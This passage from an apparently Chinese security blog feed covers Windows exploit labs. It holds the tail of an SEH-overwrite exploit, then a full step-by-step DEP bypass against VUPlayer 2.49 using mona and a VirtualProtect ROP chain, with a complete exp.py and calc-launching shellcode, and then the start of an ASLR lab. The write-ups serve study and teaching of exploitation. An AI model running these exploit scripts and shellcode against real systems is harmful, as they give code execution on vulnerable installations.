<span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    offset = <span class="number">1112</span> <span class="comment"># 使用mona重新计算偏移量，得到1112</span></span><br><span class="line">    jmp_6 = <span class="string">b&#x27;\xeb\x06&#x27;</span>	+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">2</span> </span><br><span class="line">    jmp_real_shellcode = <span class="string">b&quot;\xE9\x9F\xFB\xFF\xFF&quot;</span> <span class="comment"># jmp $-1116</span></span><br><span class="line">    seh = <span class="string">b&#x27;\x11\x1a\x40\x00&#x27;</span> <span class="comment"># ppt</span></span><br><span class="line">    payload = shellcode + <span class="string">b&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(shellcode)-<span class="number">4</span>) + jmp_6 + seh + jmp_real_shellcode</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">3000</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<p>执行流为：</p>
<p><img src="/../pic/Exploitme-Cookie/process-flow.png" alt="process-flow"></p>
<p>再次运行，成功弹出计算器：</p>
<p><img src="/../pic/Exploitme-Cookie/pwn.png" alt="pwn"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈空间不足分为两种情况</p>
<ul>
<li>不够shellcode存在</li>
<li>不够shellcode执行所需</li>
</ul>
<p>fread无法一下子读取太长的数据，不然会出错</p>
<ul>
<li><p>要么限制payload长度，通常不能超过8k</p>
</li>
<li><p>要么修改读取逻辑，进行分块多次读取</p>
<p>将</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fread(name, <span class="number">1</span>, bytes, f);</span><br></pre></td></tr></table></figure>

<p>更改为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pos &lt; bytes) &#123; </span><br><span class="line">    <span class="type">int</span> len = bytes - pos &gt; <span class="number">200</span> ? <span class="number">200</span> : bytes - pos; </span><br><span class="line">    fread(name + pos, <span class="number">1</span>, len, f); </span><br><span class="line">    pos += len; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Exploitme3——ROP without ASLR</title>
    <url>/2023/10/20/Windwos-PWN/Exploitme/Exploitme3/</url>
    <content><![CDATA[<p>当程序开启数据执行保护（DEP）后，我们无法在栈上执行<code>shellcode</code>，但可以利用程序中自带的代码片段（gadget），使<code>ret</code>指令和栈数据相配合，将 <code>gadget</code>串成一串，也能起到<code>shellcode</code>的效果，这就是返回导向编程<code>ROP</code>。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.freebuf.com/articles/system/173654.html">Windows漏洞利用开发：返回导向编程(ROP)</a></li>
</ul>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><p>Immunity Debugger : 一个windows下由纯python编写的调试器，有丰富的python安全工具库。</p>
<ul>
<li>下载链接：<a href="https://github.com/kbandla/ImmunityDebugger/releases">ImmunityDebugger</a></li>
</ul>
</li>
<li><p>mona插件：将mona.py放到Immunity Debugger 的PyCommands目录下即可</p>
<ul>
<li>下载链接：<a href="https://github.com/corelan/mona/raw/master/mona.py">mona.py</a></li>
</ul>
</li>
<li><p>VUPlayer ： 一个小巧的音乐播放器。2.49版本在打开 play list 时存在缓冲区溢出漏洞。</p>
<ul>
<li>下载链接：<a href="https://www.exploit-db.com/exploits/40018">VUPlayer 2.49</a></li>
</ul>
</li>
<li><p>DEP：开启操作系统的<code>DEP</code>设置（WIN10下：设置—系统—关于—高级系统设置—性能-设置—数据执行保护—选中“DEP(U)”）</p>
</li>
<li><p>随机基址(ASLR): 关闭</p>
</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>编写python脚本，生成一个 test.m3u</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">3000</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
<p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确定存在栈溢出漏洞</p>
<p><img src="/../pic/Exploitme-ROP/EIP41414141.png" alt="EIP41414141"></p>
<h3 id="确认偏移量"><a href="#确认偏移量" class="headerlink" title="确认偏移量"></a>确认偏移量</h3><p>在windbg中输入以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_create 3000</span><br><span class="line">或者</span><br><span class="line">!py mona pc 3000</span><br></pre></td></tr></table></figure>

<p>将得到的3000个字符拷贝到<code>test.m3u</code>文件，重复之前的操作，得到</p>
<p><img src="/../pic/Exploitme-ROP/EIPpattern.png" alt="EIPpattern"></p>
<p>之后执行以下命令，确定偏移量（偏移量指输入点距栈中返回地址之间的字节数）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_offset 68423768</span><br><span class="line">或</span><br><span class="line">!py mona po 0x68423768  # 0x可以省略</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/../pic/Exploitme-ROP/mona_po.png" alt="mona_po"></p>
<p>确定偏移量为 1012 。</p>
<p>使用以下脚本，重复操作，测试偏移量是否正确：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload = &quot;A&quot;*1012 + &quot;B&quot;*4</span><br><span class="line">file = open(&#x27;test.m3u&#x27;,&#x27;w&#x27;)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>看到 EIP 成功被 0x42424242 覆盖，偏移量正确</p>
<p><img src="/../pic/Exploitme-ROP/EIP42424242.png" alt="EIP42424242"></p>
<h3 id="直接在栈上执行shellcode"><a href="#直接在栈上执行shellcode" class="headerlink" title="直接在栈上执行shellcode"></a>直接在栈上执行shellcode</h3><h4 id="搜索跳转指令"><a href="#搜索跳转指令" class="headerlink" title="搜索跳转指令"></a>搜索跳转指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona j -r esp</span><br></pre></td></tr></table></figure>

<p>得到以下输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;jmp esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 1 </span><br><span class="line">[+] Results : </span><br><span class="line">0x1000d0ff |   0x1000d0ff : jmp esp | null &#123;PAGE_EXECUTE_READWRITE&#125; [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASS.dll), 0x0</span><br><span class="line">0x1010539f |   0x1010539f : jmp esp |  &#123;PAGE_EXECUTE_READWRITE&#125; [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASSWMA.dll), 0x0</span><br><span class="line">...、、</span><br><span class="line">    Found a total of 15 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:04.439000</span><br></pre></td></tr></table></figure>

<h4 id="尝试执行栈上指令"><a href="#尝试执行栈上指令" class="headerlink" title="尝试执行栈上指令"></a>尝试执行栈上指令</h4><p>选用 <code>0x1010539f</code>（<code>0x1000d0ff</code>存在”<code>\x00</code>“，不能正常工作）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">1012</span> + <span class="string">b&quot;\x9f\x53\x10\x10&quot;</span> + <span class="string">b&quot;\xcc&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>在windbg下打开<code>VMPlayer</code>，拖入<code>test.m3u</code>文件，得到以下结果：</p>
<p><img src="/../pic/Exploitme-ROP/DEP_c0000005.png" alt="dep_red"></p>
<p>说明开启了<code>DEP</code>防护，无法直接执行shellcode。</p>
<h3 id="构造ROP使用绕过DEP"><a href="#构造ROP使用绕过DEP" class="headerlink" title="构造ROP使用绕过DEP"></a>构造ROP使用绕过DEP</h3><p>我们需要使用<code>ROP</code>调用<code>VirtualProtect</code>函数，以关闭shellcode所在页的<code>DEP</code>保护。</p>
<h4 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h4><p>首先介绍VirtualProtect函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOL VirtualProtect (</span><br><span class="line">	LPVOID lpAddress, 	# 要改变属性的内存起始地址</span><br><span class="line">	DWORD dwSize,		# 要改百年属性的内存字节数</span><br><span class="line">	DWORD flNewProtect,	# 输入新的页属性</span><br><span class="line">	PDWORD lpflOldProtect # 返回旧的页属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>页属性为 <code>PAGE_EXECUTE_READWRITE(0x40)</code>时，该页可读可写可执行。</p>
<p>我们的调用参数应该如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span> <span class="params">(</span></span><br><span class="line"><span class="params">	shellcode_addr，# shellcode起始地址</span></span><br><span class="line"><span class="params">    shellcode_len, 	# 不小于shellcode长度，比如 <span class="number">0x201</span>(常用)</span></span><br><span class="line"><span class="params">    <span class="number">0x40</span>,			# PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="params">    某个可写地址，</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h4 id="mona搜索ROPChain"><a href="#mona搜索ROPChain" class="headerlink" title="mona搜索ROPChain"></a>mona搜索ROPChain</h4><ul>
<li>优先使用程序本身的<code>dll</code>而不是系统库，前者没开启<code>ASLR</code>，即便系统重启，<code>payload</code>仍有效。</li>
<li><code>-cp nonull</code> 避免出现”<code>\x00</code>“字节导致<code>payload</code>被截断</li>
<li><code>mona</code>可以设置日志文件的存放目录（目录路径不要加双引号）</li>
</ul>
<p><code>windbg</code>下执行以下命令，由于缺少符文报错，尝试<code>immunity debugger</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;bass,basswma,bassmidi&quot;</span> -cp nonull</span><br></pre></td></tr></table></figure>

<p><code>immunity debugger</code>下执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme-ROP\mona-log</span><br><span class="line">!mona rop -m &quot;bass,basswma,bassmidi&quot; -cp nonull</span><br></pre></td></tr></table></figure>

<p>成功执行，输出信息如下：</p>
<p><img src="/../pic/Exploitme-ROP/immu-mona-rop.png" alt="immu-mona-rop"></p>
<p>在日志目录下生成了以下几个文件：</p>
<p><img src="/../pic/Exploitme-ROP/mona-log.png" alt="mona-log"></p>
<p>查看<code>rop_chains.txt</code>，其中包含建议使用的<code>rop_chain</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Register setup for VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class="line"> ...</span><br><span class="line"> def create_rop_chain():</span><br><span class="line">    # rop chain generated with mona.py - www.corelan.be</span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      #[---INFO:gadgets_to_set_esi:---]</span><br><span class="line">      0x10015f82,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x1060e25c,  # ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span><br><span class="line">      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span><br><span class="line">      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ebp:---]</span><br><span class="line">      </span><br><span class="line">      0x1001d748,  # POP EBP # RETN [BASS.dll] </span><br><span class="line">      0x1010539f,  # &amp; jmp esp [BASSWMA.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_ebx:---]</span><br><span class="line">      0x10015f77,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xfffffdff,  # Value to negate, will become 0x00000201</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_edx:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xffffffc0,  # Value to negate, will become 0x00000040</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ecx:---]</span><br><span class="line">      0x101012e0,  # POP ECX # RETN [BASSWMA.dll] </span><br><span class="line">      0x1003f0cc,  # &amp;Writable location [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_edi:---]</span><br><span class="line">      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] </span><br><span class="line">      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_eax:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x90909090,  # nop</span><br><span class="line">      #[---INFO:pushad:---]</span><br><span class="line">      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] </span><br><span class="line">    ]</span><br><span class="line">    return &#x27;&#x27;.join(struct.pack(&#x27;&lt;I&#x27;, _) for _ in rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br></pre></td></tr></table></figure>

<h4 id="RopChain分析"><a href="#RopChain分析" class="headerlink" title="RopChain分析"></a>RopChain分析</h4><p><code>ropchain</code>是十分精巧的。ropchain的主要目的是为 <code>VirtualProtect()</code> 提供参数和控制执行流。</p>
<p>在执行完<code>pushad</code>之后，栈中数据的内容应该如下：</p>
<ul>
<li><code>_edi</code> 表示执行<code>pushad</code>前对应寄存器中的值</li>
<li><code>-&gt; &lt;func&gt;</code> 表示<code>&lt;func&gt;</code>的地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_edi # -&gt; retn</span><br><span class="line">_esi # -&gt; vitrualprotect</span><br><span class="line">_ebp # -&gt; jump esp</span><br><span class="line">_esp # shllcode的起始地址</span><br><span class="line">_ebx # 0x201</span><br><span class="line">_edx # 0x40</span><br><span class="line">_ecx # 0x1003f0cc，一个可写地址</span><br><span class="line">_eax # nop</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>

<p>执行了<code>pushad</code>之后，<code>retn</code>指令从栈顶端取出新的指令地址，并跳转至该地址开始执行，发现还是个<code>retn</code>，重复之前过程，便将控制流指向了<code>VirtualProtect</code>函数。</p>
<p><code>VirtualProtect</code>函数将<code>_ebp</code>看作返回地址，将再下面的四个值看作四个输入的参数，函数效果为关闭<code>shellcode</code>所在页内存的<code>DEP</code>保护。<code>_eax</code>没用。</p>
<p>执行完后，<code>jump esp</code>便将执行流转到<code>shellcode</code>。</p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>完整的<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x10015f82</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1060e25c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span></span><br><span class="line">      <span class="number">0x1001eaf1</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10030950</span>,  <span class="comment"># XCHG EAX,ESI # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x1001d748</span>,  <span class="comment"># POP EBP # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1010539f</span>,  <span class="comment"># &amp; jmp esp [BASSWMA.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x10015f77</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10032f32</span>,  <span class="comment"># XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10038a6d</span>,  <span class="comment"># XCHG EAX,EDX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x101012e0</span>,  <span class="comment"># POP ECX # RETN [BASSWMA.dll] </span></span><br><span class="line">      <span class="number">0x1003f0cc</span>,  <span class="comment"># &amp;Writable location [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10603658</span>,  <span class="comment"># POP EDI # RETN [BASSMIDI.dll] </span></span><br><span class="line">      <span class="number">0x1001dc05</span>,  <span class="comment"># RETN (ROP NOP) [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1001d7a5</span>,  <span class="comment"># PUSHAD # RETN [BASS.dll] </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line">    </span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line">shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">1012</span> + rop_chain + shellcode</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;payload.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>运行<code>exp.py</code>，将生成的<code>payload.m3u</code>拖入<code>VUPlayer</code>，成功弹出计算器，如图：</p>
<p><img src="/../pic/Exploitme-ROP/pwn.png" alt="pwn"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><code>mona</code>在<code>Immunity debugger</code>中比在<code>Windbg</code>中更好用，虽然后者更美观。</li>
<li><code>mona</code>很智能，生成的<code>rop_chains.txt</code>中的<code>ropchain</code>可以直接使用。</li>
</ol>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Exploitme4——ROP with ASLR</title>
    <url>/2023/10/27/Windwos-PWN/Exploitme/Exploitme4/</url>
    <content><![CDATA[<p>当程序开启了<code>ASLR</code>后，程序可能通过需要想办法泄露一些模块的基地址，来构建有效的payload。</p>
<p>下面我们要进行的实验，采取的思路是：泄露系统模块的基址 + 利用对应模块中的gadget构建Ropchain + shellcode。</p>
<p>参考资料：</p>
<ul>
<li>[<a href="https://bbs.kanxue.com/thread-207073.htm">翻译]Windows Exploit开发教程第十章 Exploitme4(ASLR)-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></li>
</ul>
<span id="more"></span>



<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>关闭 &#x2F;GS</li>
<li>打开 ASLR</li>
<li>打开 DEP</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Name</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span>* ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Name</span>() : <span class="built_in">ptr</span>((<span class="type">int</span>*)name) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">getNameBuf</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">readFromFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(name); ++i) <span class="comment">// for有什么用呢？</span></span><br><span class="line">            name[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        FILE* f = <span class="built_in">fopen</span>(filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!f)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span 